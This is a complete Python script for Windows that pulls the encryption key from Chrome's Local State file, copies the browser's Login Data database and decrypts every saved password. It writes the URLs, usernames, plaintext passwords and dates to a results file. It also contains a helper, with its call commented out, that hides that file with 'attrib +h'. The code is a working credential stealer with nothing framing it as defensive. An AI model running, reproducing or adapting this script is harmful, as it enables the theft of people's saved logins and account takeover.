import os
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import json
import datetime

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime."""
    return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove DPAPI
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        password = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except Exception as e:
            print(f"Error using CryptUnprotectData: {e}")
            return ""
def make_file_hidden(filepath):
    try:
        os.system(f'attrib +h "{filepath}"')
    except Exception as e:
        pass
    
def main():
    try:
        print("Starting script...")
        # Path to user's Chrome data
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        print(f"Database path: {db_path}")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # print(f"Database copied to: {filename}")

        # Connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()

        # Get the encryption key
        key = get_encryption_key()
        print("Encryption key obtained")

        # Query the database
        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins")
        script_dir = os.path.dirname(os.path.abspath(__file__))  # Directory where the script is located
        result_path = os.path.join(script_dir, "results.txt")
        
        # print(f"Results will be saved to: {result_path}")
        
        with open(result_path, "a") as f:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                ciphertext = row[3]
                date_created = row[4]
                date_last_used = row[5]
                decrypted_password = decrypt_password(ciphertext, key)

                f.write(f"Origin URL: {origin_url}\n")
                f.write(f"Action URL: {action_url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {decrypted_password}\n")
                f.write(f"Date created: {get_chrome_datetime(date_created)}\n")
                f.write(f"Date last used: {get_chrome_datetime(date_last_used)}\n\n")
        
        # print("Data written to results.txt")
        # Make the results.txt file hidden if you want to
        # make_file_hidden(result_path)

        cursor.close()
        db.close()
        os.remove(filename)
        # print("Script finished successfully")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
